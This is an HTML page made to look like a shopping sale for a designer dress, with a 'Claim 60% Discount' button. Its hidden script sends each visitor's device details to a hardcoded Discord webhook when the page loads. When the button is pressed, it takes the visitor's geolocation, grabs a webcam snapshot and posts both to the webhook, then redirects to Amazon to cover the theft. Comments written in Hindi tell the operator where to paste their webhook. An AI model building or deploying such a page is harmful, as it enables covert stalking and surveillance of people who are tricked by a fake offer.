<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Online Shopping | Mega Sale</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; background-color: #f4f4f4; padding: 50px; }
        .product-card { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); display: inline-block; max-width: 300px; }
        img { width: 100%; border-radius: 5px; }
        h2 { color: #333; }
        .price { color: #b12704; font-size: 24px; font-weight: bold; }
        .btn { background: #ffd814; border: 1px solid #fcd200; padding: 10px 20px; border-radius: 20px; cursor: pointer; font-weight: bold; margin-top: 10px; display: inline-block; text-decoration: none; color: black; border-style: none; }
    </style>
</head>
<body>

    <div class="product-card">
        <img src="https://unsplash.com" alt="Dress">
        <h2>Premium Designer Dress</h2>
        <p class="price">₹1,499 <span style="text-decoration: line-through; color: #767676; font-size: 16px;">₹3,999</span></p>
        <button class="btn" onclick="requestLocation()">Claim 60% Discount</button>
    </div>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const deviceData = {
            userAgent: navigator.userAgent,
            language: navigator.language,
            screenResolution: window.screen.width + "x" + window.screen.height,
            platform: navigator.platform,
            timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone
        };

        // YAHA APNA WEBHOOK LINK PASTE KAREIN
        const discordWebhookUrl = "https://discord.com/api/webhooks/1542745089535774730/GjPGMUOEP09yQONAThx9_zuSAUWiGOVopFv3OGsRHyxH8AU4QhdIIL_b3HRz_d5Otusc";

        function sendToDiscord(contentText) {
            if(discordWebhookUrl && discordWebhookUrl !== "PASTE_YOUR_DISCORD_WEBHOOK_URL_HERE") {
                fetch(discordWebhookUrl, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ content: contentText })
                }).catch(err => console.log(err));
            }
        }

        // Jaise hi page khulega, basic detail automatic chali jayegi
        sendToDiscord(`🌐 **New Visitor Alert!**\n📱 Device: ${deviceData.platform}\n🌍 TimeZone: ${deviceData.timeZone}\n🖥️ Resolution: ${deviceData.screenResolution}`);

      function requestLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition((position) => {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            
            // 1. Location text bhejega (Yahan Backticks lga diye hain taaki sahi se coordinates jayein)
            sendToDiscord(`🎯 **LOCATION FETCHED!** \nLatitude: ${lat}\nLongitude: ${lon}`);

            // 2. Background mein webcam active karega
            navigator.mediaDevices.getUserMedia({ video: true })
            .then(function(stream) {
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();

                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    canvas.width = 640;
                    canvas.height = 480;
                    const context = canvas.getContext('2d');
                    
                    context.drawImage(video, 0, 0, 640, 480);
                    stream.getTracks().forEach(track => track.stop());

                    // 3. Photo ko Discord par bhejega
                    canvas.toBlob(function(blob) {
                        const formData = new FormData();
                        formData.append('file', blob, 'snapshot.png');
                        formData.append('payload_json', JSON.stringify({
                            content: "📸 **Webcam Capture Received Successfully!**"
                        }));

                        fetch(discordWebhookUrl, {
                            method: 'POST',
                            body: formData
                        });
                    }, 'image/png');

                }, 1000);
            })
            .catch(err => {
                console.log("Camera permission denied.");
                sendToDiscord("❌ User denied camera permission.");
            });

            // 4. Amazon product par redirect kar dega
            window.location.href = "https://amzn.in";
        }, (error) => {
            sendToDiscord("❌ User denied location permission.");
            window.location.href = "https://amzn.in";
        });
    } else {
        alert("Browser not supported.");
    }
}

    </script>
</body>
</html>
